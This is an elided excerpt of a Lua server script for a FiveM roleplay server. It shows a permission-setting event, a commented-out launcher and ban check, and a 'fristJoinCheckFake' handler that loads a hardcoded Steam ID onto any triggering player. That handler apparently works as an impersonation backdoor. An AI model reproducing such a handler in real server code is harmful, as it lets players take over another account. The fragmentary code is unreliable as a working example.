...
AddEventHandler('setUserPerm', function(source, perm)
	local Source = source
	local Perm = perm
	if(Users[Source])then
...
AddEventHandler('playerConnecting', function(name, setKickReason, defer)
	...
	defer.defer()
	defer.update('[Launcher] Checking your HWID . . .')
	...
	--		exports.ghmattimysql:execute("SELECT * FROM denied WHERE steamid = @steamid",{
	--			["@steamid"] = stmid
	--		}, function(result)
	--			if result[1] then
	--				defer.done("[Launcher]: Shoma az server ban shodid!")
	--			else

	--				for i=1, #ESX.WhiteList do
	--					if stmid == ESX.WhiteList[i] then
	--						defer.done()
	--						return
	--					end
	--				end

	--				defer.done("Lotfan Ba Launcher Vared Shavid, Link Launcher: wWw.MadCity.IR/launcher")
	--			end
	--		end)
	--	end
	--end)
...
AddEventHandler('fristJoinCheckFake', function(source)
	local Source = source
	Citizen.CreateThread(function()
		local id = 'steam:11000013ff94da8'
		LoadUser(id, Source)
		justJoined[Source] = true
		TriggerClientEvent("enablePvp", Source)
	end)
